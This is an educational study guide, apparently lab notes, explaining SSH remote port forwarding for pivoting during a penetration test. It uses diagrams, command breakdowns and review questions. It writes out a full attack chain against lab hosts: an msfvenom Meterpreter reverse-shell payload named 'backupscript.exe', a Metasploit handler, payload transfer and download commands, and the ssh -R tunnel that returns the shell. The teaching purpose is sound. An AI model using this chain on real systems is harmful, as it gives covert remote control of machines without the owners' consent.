# 1. 🧠 What Is Remote / Reverse Port Forwarding?

We previously looked at:

### Local Port Forwarding

SSH listens on **our local machine** and forwards traffic to a service accessible from the remote/pivot host.

```text
Attack Host
     │
     │ SSH
     ▼
Pivot Host ───────► Internal Service
```

### Dynamic Port Forwarding

SSH acts as a SOCKS proxy, allowing us to route traffic through a pivot host toward an internal network.

```text
Attack Host
     │
     │ SOCKS
     ▼
Pivot Host
     │
     ▼
Internal Network
```

### Remote / Reverse Port Forwarding

The direction changes.

We make the **remote/pivot host listen on a port**, and connections arriving there are forwarded back toward a service on our attack host.

```text
Remote/Pivot Host
       │
       │ listens
       ▼
    Port 8080
       │
       │ SSH tunnel
       ▼
Attack Host
    Port 8000
```

The important command is:

```bash
ssh -R
```

---

# 2. 🖼️ Big-Picture Visualization

![Image](https://images.openai.com/static-rsc-4/_WKcoLnUwuRGfL0lt_NBspruu2ggaGfkq94IZNY0HNJyC358Guen8zlih9PtZKjn8j-5vQwHmah2KhwCXLLc_TY4ZmYPOBKKSwFmLA17Za6jgG972igsKnf1FJzbc6SwDT_wEDP62UUhShhZFm3e31mC0upNbJu7dB3WbS4bGycELPSZBdnetmnqDt2Vw8Fn?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/VvTo0dDMDgHEWE-JJP4Gwo-eOn5X6ldnGZFVQs6JOFkDUwSdHYeKx6264DdF4yZbAepfqjyNOMxI9S_8qMaJlp4E4Cl1LQsevZp457bsS8z9cBvZsgmhkCR1KmhbEJ5qjNWZz_CKWM2VjDiivNkif5l16L9ye3J1gUSlx2TQz32i5kqFrsE5eHOxiPTpK0vL?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/khR-ldl7WVz4v-bQziViehtiN31TGrynj7eYiJWDVWCBeN9WothmTI9PUySlRYaoXCdBUWmpO8wbJlYu6rKk5XZuYK93aux3ulodBgjMoISw5qZ16ZriiBeHvwDOZ9Qv6-r0R8N4bCW6a9s6s372ZvSo-CNayfv5-VR8g81mSID5rVCeC1pvqPTtA4bSXmxd?purpose=fullsize)

The lab network:

```text
                         ATTACK HOST
                         10.10.15.5
                              │
                              │ SSH
                              ▼
                    ┌──────────────────┐
                    │  Ubuntu Pivot    │
                    │ 10.129.15.50     │
                    │ 172.16.5.129     │
                    └────────┬─────────┘
                             │
                             │ Internal Network
                             ▼
                    ┌──────────────────┐
                    │    Windows A     │
                    │  172.16.5.19    │
                    │                  │
                    │ RDP / Internal   │
                    └──────────────────┘
```

---

# 3. 🎯 The Problem We Are Solving

The attack host is:

```text
10.10.15.5
```

The Ubuntu pivot has:

```text
10.129.15.50
172.16.5.129
```

Windows A has:

```text
172.16.5.19
```

The important networking problem is:

```text
Windows A
172.16.5.19
      │
      │
      X
      │
10.10.15.5
Attack Host
```

Windows A **does not have a direct route** to the attack host's network.

---

# 4. 🚫 Why a Normal Reverse Shell Doesn't Work

Suppose we create a reverse shell payload on Windows A.

Normally:

```text
Windows A
172.16.5.19
     │
     │ Reverse connection
     ▼
Attack Host
10.10.15.5:8000
```

But Windows A doesn't know how to reach:

```text
10.10.15.5
```

because it only has connectivity within the:

```text
172.16.5.0/23
```

network.

Therefore:

```text
Windows A
     │
     │ Connect to 10.10.15.5
     ▼
No usable route
     │
     X
     ▼
Attack Host
```

---

# 5. 🔑 The Pivot Host

The Ubuntu server solves the routing problem because it can communicate with both sides.

```text
                    Ubuntu
                  Pivot Host
                      │
          ┌───────────┴───────────┐
          │                       │
          ▼                       ▼
   Attack Host              Windows A
   10.10.15.5              172.16.5.19
```

Therefore, Ubuntu becomes the **pivot host**.

### Key concept

> A pivot host is a system that provides a common connection point between otherwise inaccessible network segments.

---

# 6. 🧩 Why RDP Alone Isn't Always Enough

The material explains that having only a Remote Desktop connection may not be sufficient during a penetration test.

Examples include situations where you need to:

- Upload files.
    
- Download files.
    
- Work when the RDP clipboard is disabled.
    
- Use Meterpreter.
    
- Use exploits requiring a shell/session.
    
- Perform deeper enumeration.
    
- Interact with low-level Windows APIs.
    
- Use functionality unavailable through normal Windows executables.
    

Therefore:

```text
RDP Access
    ≠
Complete Testing Capability
```

A reverse connection through the pivot can provide another way to interact with the Windows system.

---

# 7. 🔄 The Reverse Port Forwarding Concept

The desired connection is:

```text
Windows A
172.16.5.19
      │
      │ Reverse HTTPS
      ▼
Ubuntu Pivot
172.16.5.129:8080
      │
      │ SSH reverse forwarding
      ▼
Attack Host
0.0.0.0:8000
      │
      ▼
Metasploit Handler
```

The critical relationship is:

```text
172.16.5.129:8080
          ↓
      SSH tunnel
          ↓
0.0.0.0:8000
```

---

# 8. 🧠 Why Port 8080?

The payload is configured to connect to:

```text
172.16.5.129:8080
```

Why?

Because **172.16.5.129 is reachable by Windows A**.

Windows A can therefore make:

```text
Windows A
     │
     ▼
172.16.5.129:8080
```

The Ubuntu host then forwards that traffic through the SSH tunnel to:

```text
Attack Host:8000
```

---

# 9. 🧠 Why Port 8000?

The Metasploit listener is running on:

```text
0.0.0.0:8000
```

Therefore the complete mapping is:

```text
Ubuntu:8080
     │
     │ SSH -R
     ▼
Attack Host:8000
```

---

# 10. 📊 Complete Network Diagram

```text
                         ATTACK HOST
                         10.10.15.5
                              │
                              │
                         MSF Handler
                         0.0.0.0:8000
                              ▲
                              │
                       SSH Reverse Tunnel
                              │
                              │
                    Ubuntu Pivot Host
                    172.16.5.129
                         :8080
                              ▲
                              │
                       Reverse HTTPS
                              │
                              │
                    Windows A
                    172.16.5.19
```

### Remember the direction:

```text
Windows
   ↓
Ubuntu:8080
   ↓
SSH tunnel
   ↓
Attack Host:8000
```

---

# 11. 🛠️ Step 1 — Create the Windows Payload

The supplied material uses `msfvenom` to create a Windows x64 Meterpreter HTTPS payload.

The important configuration is:

```text
LHOST = Internal IP of Pivot Host
LPORT = 8080
```

The supplied command is:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

---

# 12. 🔍 Breaking Down the `msfvenom` Command

```text
msfvenom
```

Payload generation tool.

```text
-p windows/x64/meterpreter/reverse_https
```

Creates a Windows x64 Meterpreter reverse HTTPS payload.

```text
lhost=<InternalIPofPivotHost>
```

The payload connects to the **pivot host**, not directly to the attack host.

```text
LPORT=8080
```

The payload connects to port:

```text
8080
```

on the pivot.

```text
-f exe
```

Output format:

```text
Windows executable
```

```text
-o backupscript.exe
```

Output filename.

---

# 13. ⭐ Critical Point — LHOST Is NOT the Attack Host

This is one of the most important concepts in this lab.

### Wrong conceptual configuration

```text
Windows A
   │
   ▼
Attack Host:8000
```

Windows can't reach the attack host.

### Correct configuration

```text
Windows A
   │
   ▼
Ubuntu Pivot:8080
   │
   ▼
SSH tunnel
   │
   ▼
Attack Host:8000
```

Therefore:

> **The payload's LHOST is the pivot host's internal IP address.**

---

# 14. 🧰 Step 2 — Configure Metasploit Handler

The supplied material uses:

```text
exploit/multi/handler
```

Then:

```text
set payload windows/x64/meterpreter/reverse_https
```

Then:

```text
set lhost 0.0.0.0
set lport 8000
```

And finally:

```text
run
```

The supplied output is:

```text
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

---

# 15. 🧠 Why Handler Uses `0.0.0.0`

The handler listens on:

```text
0.0.0.0:8000
```

This means it can accept connections arriving through the local interfaces/socket as configured.

The important point is that the handler's port is:

```text
8000
```

while the pivot's listening port is:

```text
8080
```

---

# 16. 📦 Step 3 — Transfer Payload to Pivot

Because SSH access to the Ubuntu pivot already exists, the material uses:

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

Conceptually:

```text
Attack Host
     │
     │ SCP
     ▼
Ubuntu Pivot
     │
     ▼
backupscript.exe
```

---

# 17. 🌐 Step 4 — Start HTTP Server on Pivot

On Ubuntu:

```bash
python3 -m http.server 8123
```

This creates a simple HTTP server.

The payload becomes available through:

```text
http://172.16.5.129:8123/
```

Conceptually:

```text
Ubuntu
  │
  │ HTTP :8123
  ▼
backupscript.exe
```

---

# 18. 💻 Step 5 — Download Payload to Windows

The supplied material uses PowerShell:

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Why can Windows download it?

Because:

```text
Windows A
172.16.5.19
     │
     │ Can reach
     ▼
Ubuntu
172.16.5.129
```

So the file transfer occurs entirely through the internal network.

---

# 19. 🔀 Step 6 — Create SSH Remote Port Forward

This is the **most important command in the entire section**.

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

Example conceptually:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<Ubuntu-IP> -vN
```

---

# 20. 🔍 Breaking Down `ssh -R`

The syntax is:

```text
-R [remote_bind_address:]remote_port:destination_host:destination_port
```

In this lab:

```text
-R 172.16.5.129:8080:0.0.0.0:8000
```

means:

```text
Ubuntu:8080
     ↓
SSH tunnel
     ↓
Attack Host:8000
```

---

# 21. 🧩 `-R` Explained

### `-R`

Creates a **remote port forward**.

The remote SSH server/pivot listens on the specified port.

### `172.16.5.129`

The pivot host's internal IP.

### `8080`

Port opened/listened to on the pivot.

### `0.0.0.0`

Destination host from the attack-host side.

### `8000`

Destination port where Metasploit is listening.

---

# 22. 🔊 What Does `-vN` Mean?

The supplied command uses:

```text
-vN
```

### `-v`

Verbose mode.

Useful for seeing SSH forwarding activity.

### `-N`

Don't execute a remote shell/command.

So:

```text
-vN
```

essentially means:

> Create the SSH connection and forwarding tunnel while showing verbose forwarding information, without opening a normal login shell.

---

# 23. 🧠 The Most Important Mental Model

Don't think of `-R` as:

```text
Attack Host → Remote Host
```

Think:

```text
REMOTE LISTENER
      ↓
SSH TUNNEL
      ↓
LOCAL DESTINATION
```

In this lab:

```text
REMOTE LISTENER
172.16.5.129:8080
      ↓
SSH TUNNEL
      ↓
LOCAL DESTINATION
0.0.0.0:8000
```

---

# 24. 🔄 Complete Connection Sequence

Now combine everything:

### 1.

Metasploit listens:

```text
Attack Host
0.0.0.0:8000
```

### 2.

SSH creates:

```text
Ubuntu:8080
       ↓
SSH tunnel
       ↓
Attack Host:8000
```

### 3.

Windows payload is configured for:

```text
172.16.5.129:8080
```

### 4.

Windows executes the payload.

### 5.

Windows connects to:

```text
172.16.5.129:8080
```

### 6.

Ubuntu receives the connection.

### 7.

SSH forwards it:

```text
Ubuntu:8080
     ↓
SSH
     ↓
Attack Host:8000
```

### 8.

Metasploit receives the connection.

### 9.

Meterpreter session opens.

---

# 25. 🖼️ Full Lab Flow

```text
                         ATTACK HOST
                         10.10.15.5
                              │
                              │
                    ┌─────────▼─────────┐
                    │ Metasploit        │
                    │ Handler :8000     │
                    └─────────▲─────────┘
                              │
                         SSH Tunnel
                              │
                    ┌─────────▼─────────┐
                    │ Ubuntu Pivot      │
                    │ 172.16.5.129      │
                    │                   │
                    │ Listener :8080    │
                    └─────────▲─────────┘
                              │
                        Reverse HTTPS
                              │
                    ┌─────────▼─────────┐
                    │ Windows A         │
                    │ 172.16.5.19       │
                    │                   │
                    │ backupscript.exe  │
                    └───────────────────┘
```

---

# 26. 🔥 Why This Works

The fundamental problem was:

```text
Windows → Attack Host
```

was impossible because Windows had no route to the attack host network.

We change the path to:

```text
Windows
   ↓
Ubuntu
   ↓
SSH tunnel
   ↓
Attack Host
```

Ubuntu is reachable by Windows and connected through SSH to the attack host.

Therefore, Ubuntu becomes the **bridge/pivot**.

---

# 27. 🧾 Understanding the SSH Logs

After executing the payload, the pivot displays logs such as:

```text
client_request_forwarded_tcpip:
listen 172.16.5.129 port 8080,
originator 172.16.5.19 port 61355
```

This tells us:

```text
Originator:
172.16.5.19
```

which is Windows A.

The connection arrived at:

```text
172.16.5.129:8080
```

the remote forwarded port on Ubuntu.

---

# 28. 🔍 Important Log Line

```text
connect_next:
host 0.0.0.0 ([0.0.0.0]:8000)
```

This shows SSH attempting to connect the forwarded traffic to:

```text
0.0.0.0:8000
```

where our Metasploit handler is listening.

Then:

```text
channel 1: connected to 0.0.0.0 port 8000
```

confirms that the forwarding connection reached the handler.

---

# 29. 🧠 Reading the Logs as a Story

The logs essentially tell us:

```text
Windows connected
      ↓
Ubuntu received connection on :8080
      ↓
SSH created forwarded channel
      ↓
SSH connected to :8000
      ↓
Metasploit received traffic
```

That is exactly what we wanted.

---

# 30. 🖥️ Meterpreter Session

The supplied output eventually shows:

```text
[*] Meterpreter session 1 opened
```

Then:

```text
meterpreter > shell
```

followed by:

```text
Microsoft Windows [Version 10.0.17763.1637]
```

and:

```text
C:\>
```

At this point, the reverse connection has successfully traversed the pivot.

---

# 31. ⚠️ Why Does Meterpreter Show `127.0.0.1`?

This is another **very important concept**.

The session may show:

```text
127.0.0.1:8000
```

instead of:

```text
172.16.5.19
```

Why?

Because the final connection reaching Metasploit is arriving through the **local SSH socket/tunnel**.

Conceptually:

```text
Windows
  │
  ▼
Ubuntu
  │
  ▼
SSH tunnel
  │
  ▼
127.0.0.1:8000
  │
  ▼
Metasploit
```

Therefore, Metasploit sees the local end of the forwarded connection rather than the original Windows IP.

---

# 32. 🔎 Confirming With `netstat`

The material mentions that `netstat` can show that the incoming connection is associated with the SSH service.

This is useful because it helps explain why:

```text
127.0.0.1
```

appears as the source from the attack host's perspective.

---

# 33. 🧠 Reverse Port Forwarding vs Local Port Forwarding

This distinction is **essential**.

|Feature|Local Forward|Remote/Reverse Forward|
|---|---|---|
|SSH option|`-L`|`-R`|
|Listening side|Local/SSH client side|Remote/SSH server side|
|Main idea|Bring remote service toward you|Make remote host forward connections back toward you|
|Example|`localhost:8080 → remote:80`|`remote:8080 → localhost:8000`|

### Memory trick:

```text
-L
 ↓
Local listener

-R
 ↓
Remote listener
```

---

# 34. 🧠 Three SSH Forwarding Types

## 1️⃣ Local Port Forwarding

```text
Attack Host
localhost:8080
      │
      ▼
SSH
      │
      ▼
Remote/Internal Service
```

Command:

```bash
ssh -L
```

---

## 2️⃣ Dynamic Port Forwarding

```text
Attack Host
    │
 SOCKS
    │
    ▼
Pivot
    │
    ▼
Internal Network
```

Command:

```bash
ssh -D
```

---

## 3️⃣ Remote / Reverse Port Forwarding

```text
Remote/Pivot
:8080
   │
   ▼
SSH
   │
   ▼
Attack Host
:8000
```

Command:

```bash
ssh -R
```

---

# 35. 📊 Comparison Diagram

```text
LOCAL (-L)

Attack Host
    │
 :8080
    │
    ▼
  SSH
    │
    ▼
Remote Service
 :80
```

```text
REMOTE (-R)

Remote/Pivot
    │
 :8080
    │
    ▼
  SSH
    │
    ▼
Attack Host
 :8000
```

```text
DYNAMIC (-D)

Attack Host
    │
 SOCKS :9050
    │
    ▼
  SSH
    │
    ▼
Pivot
    │
    ▼
Internal Network
```

---

# 36. 🧠 When Would You Use `-R`?

Remote port forwarding becomes useful when:

- The internal target can reach the pivot.
    
- The internal target cannot reach the attack host.
    
- You already have SSH access to a pivot.
    
- You need an internal system to initiate a connection toward a service on your attack machine.
    
- A reverse connection needs to cross a network boundary.
    

In the supplied lab:

```text
Windows → Ubuntu = YES
Windows → Attack Host = NO
Ubuntu → Attack Host = YES
```

Therefore:

```text
-R
```

is appropriate.

---

# 37. 🔥 The Key Routing Problem

Always ask yourself:

> **Who can reach whom?**

For this lab:

|From|To|Connectivity|
|---|---|---|
|Attack Host|Ubuntu|✅|
|Ubuntu|Attack Host|✅|
|Ubuntu|Windows|✅|
|Windows|Ubuntu|✅|
|Windows|Attack Host|❌|

This immediately explains why the pivot is necessary.

---

# 38. 🧠 Golden Rule for Pivoting

Before creating any tunnel, draw:

```text
SOURCE
  ↓
PIVOT
  ↓
DESTINATION
```

Then ask:

```text
Can SOURCE reach PIVOT?
Can PIVOT reach DESTINATION?
Can DESTINATION reach SOURCE?
```

If the normal route doesn't work, determine which forwarding direction solves the problem.

---

# 39. 🛠️ Important Commands From This Lab

### Generate payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

### Start Metasploit handler

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

### Transfer payload

```bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

### Start HTTP server

```bash
python3 -m http.server 8123
```

### Download from Windows

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Create remote port forward

```bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

---

# 40. 🧩 Command Relationship

Don't memorize the commands independently. Memorize their **relationship**:

```text
msfvenom
   │
   │ LHOST = Pivot
   │ LPORT = 8080
   ▼
Windows Payload
   │
   ▼
Windows → Pivot:8080
                    │
                    │ ssh -R
                    ▼
              Attack Host:8000
                    │
                    ▼
              Metasploit Handler
```

---

# 41. 📌 The Most Important Details

### Payload

```text
LHOST = 172.16.5.129
LPORT = 8080
```

### Pivot listener

```text
172.16.5.129:8080
```

### SSH forwarding destination

```text
0.0.0.0:8000
```

### Metasploit listener

```text
0.0.0.0:8000
```

### Final path

```text
172.16.5.19
      ↓
172.16.5.129:8080
      ↓
SSH
      ↓
0.0.0.0:8000
```

---

# 42. 📝 Viva Questions

### Q1. What is remote port forwarding?

Remote port forwarding allows a port on the remote SSH server to forward connections to a destination reachable through the SSH client.

### Q2. Which SSH option is used?

```text
-R
```

### Q3. Why is remote forwarding needed in this scenario?

Because Windows A cannot directly route traffic to the attack host.

### Q4. What is the pivot host?

The Ubuntu server.

### Q5. Why can Ubuntu act as a pivot?

Because it can communicate with both the attack host and the Windows target network.

### Q6. What port does the Windows payload connect to?

```text
8080
```

on the Ubuntu pivot.

### Q7. Where is the Metasploit handler listening?

```text
0.0.0.0:8000
```

### Q8. What does the SSH forwarding do?

```text
Pivot:8080
     ↓
SSH tunnel
     ↓
Attack Host:8000
```

### Q9. What does `-N` do?

It tells SSH not to execute a remote shell/command.

### Q10. What does `-v` do?

Enables verbose SSH output.

### Q11. Why might the Meterpreter connection appear as `127.0.0.1`?

Because the connection reaches Metasploit through the local side of the SSH forwarding socket.

### Q12. What is the difference between `-L` and `-R`?

```text
-L → local port forwarding
-R → remote port forwarding
```

---

# 43. ⚡ One-Minute Revision

```text
                 REMOTE / REVERSE FORWARDING
                            │
                            ▼
                      SSH -R
                            │
                            ▼
                 Remote/Pivot Listener
                       :8080
                            │
                            ▼
                      SSH Tunnel
                            │
                            ▼
                   Attack Host :8000
```

### Lab:

```text
ATTACK HOST
10.10.15.5
    │
    │ SSH
    ▼
UBUNTU PIVOT
172.16.5.129
    │
    │ :8080
    ▼
WINDOWS A
172.16.5.19
```

### Reverse connection:

```text
Windows A
   │
   ▼
Ubuntu:8080
   │
   ▼
SSH -R
   │
   ▼
Attack Host:8000
   │
   ▼
Metasploit
```

---

# 🏆 44. Ultimate Memory Trick

Remember:

> **Windows can't reach me → make Windows reach the pivot → make the pivot forward back to me.**

Or:

```text
WINDOWS
   ↓
PIVOT
   ↓
SSH -R
   ↓
ATTACK HOST
```

And the most important port mapping:

```text
             SSH -R
Pivot :8080 ───────────► Attack Host :8000
     ▲                         ▲
     │                         │
 Windows                    MSF Handler
```

**Core concept:** Remote/reverse SSH port forwarding is useful when the internal target can reach the pivot, but **cannot directly reach the attack host**. The pivot's reachable port becomes the entry point, and SSH carries that connection back to the attacker's listening service.